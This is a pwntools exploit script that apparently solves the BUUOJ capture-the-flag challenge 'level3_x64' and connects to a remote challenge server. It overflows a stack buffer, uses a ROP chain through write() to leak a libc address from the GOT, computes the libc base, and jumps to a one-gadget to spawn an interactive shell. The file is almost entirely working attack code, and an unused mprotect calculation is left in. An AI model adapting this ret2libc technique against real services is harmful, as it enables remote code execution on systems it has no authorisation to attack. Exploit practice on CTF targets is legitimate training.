from pwn import *
r = remote('node3.buuoj.cn', 26795)
#r = process('./level3_x64')
elf = ELF('./level3_x64')
libc = ELF('/libc-2.23.so')

padding = 'a' * (0x80 + 0x8)
pwn_addr = 0x4005E6

write_plt = elf.plt['write']
write_got = elf.got['write']
write_libc =  libc.symbols['write']

read_plt = elf.plt['read']

mprotect_libc = libc.symbols['mprotect']

pop_rdi_ret = 0x4006b3
pop_rsi_p_r_ret = 0x4006b1

payload = padding
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
payload += p64(write_plt)
payload += p64(pwn_addr)


r.recvuntil('Input:\n')
r.sendline(payload)
leak_addr = u64(r.recv(8))

libc_base = leak_addr - write_libc
mprotect = libc_base + libc.symbols['mprotect']
log.success(hex(libc_base))

payload = padding+p64(libc_base+0xf02a4)
r.sendline(payload)
r.interactive()


